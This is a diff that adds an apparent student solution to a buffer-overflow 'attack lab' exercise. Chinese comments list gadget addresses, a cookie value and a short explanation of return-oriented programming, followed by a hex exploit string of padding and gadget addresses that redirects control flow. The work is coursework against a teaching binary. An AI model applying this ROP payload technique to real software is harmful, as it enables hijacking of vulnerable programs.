@@ -1,0 +1,18 @@
+/*
+401aad : 48 89 e0 90 # movl %rsp, %rax
+4019c5 : 48 89 c7 90 # movl %rax, %rdi
+popq %rdi
+饼干：0x59b997fa
+4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+4019ab: 58 90 # popq %rax
+return-oriented：溢出的部分一行一个地址，然后紧接着ret会执行下一个gadget
+*/
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00 /* 存储饼干，popq 给 %rax */
+c5 19 40 00 00 00 00 00 /* movl %rax, %rdi      */
+ec 17 40 00 00 00 00 00
